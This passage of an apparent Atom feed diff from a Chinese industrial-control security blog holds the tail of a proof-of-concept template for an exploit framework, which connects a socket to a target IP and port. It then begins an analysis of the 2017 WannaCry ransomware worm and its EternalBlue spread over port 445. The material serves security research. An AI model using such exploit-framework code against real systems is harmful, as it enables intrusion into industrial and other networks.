+        &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TargetIp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TargetPort&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="k"&gt;pass&lt;/span&gt;
+
+&lt;span class="c"&gt;# POC标准入口函数&lt;/span&gt;
+&lt;span class="n"&gt;MainEntry&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MyPoc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</summary><category term="isf"></category></entry><entry><title>Wannacry(永恒之蓝)勒索蠕虫跟踪分析</title><link href="http://icsmaster.com/security/wannacry.html" rel="alternate"></link><updated>2017-05-13T14:36:00+08:00</updated><author><name>w3h</name></author><id>tag:icsmaster.com,2017-05-13:security/wannacry.html</id><summary type="html">&lt;h2&gt;一、事件跟踪&lt;/h2&gt;
 &lt;p&gt;北京时间2017年5月12日晚间，一款名为Wannacry 的蠕虫勒索软件袭击全球网络，经研究发现这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。“永恒之蓝”通过扫描开放445文件共享端口的Windows电脑甚至是相关移动终端，无需用户进行任何操作，只要开机联网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等一系列恶意程序。这被认为是迄今为止最巨大的勒索交费活动，影响到近百个国家上千家企业及公共组织。 该软件被认为是一种蠕虫变种（也被称为“Wannadecrypt0r”、“wannacryptor”或“ wcry”）。 像其他勒索软件的变种一样，WannaCry也阻止用户访问计算机或文件，要求用户需付费解锁。相关影响截图如下：&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/1.jpg" /&gt;&lt;/p&gt;
 &lt;p&gt;工匠实验室是华创网安旗下的专注于工控安全领域的研究实验室，作为工控安全的守护者，紧急启动应急响应，对事件和病毒进行了相关分析，希望通过微薄之力对网络安全做出贡献。&lt;/p&gt;
